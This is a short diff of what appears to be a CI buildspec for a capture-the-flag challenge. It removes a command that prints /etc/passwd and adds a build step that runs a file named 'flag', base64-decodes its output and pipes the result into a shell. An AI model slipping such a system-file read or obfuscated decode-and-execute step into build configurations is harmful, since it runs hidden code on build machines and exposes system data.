@@ -3,5 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "This build worked, did you fix it, or just get lucky?"
-      - cat /etc/passwd
+      - echo "This build worked, or are you trying to cheat?"
+      - echo "Here's your flag"
+      - chmod +x flag
+      - sh flag | base64 --decode | sh
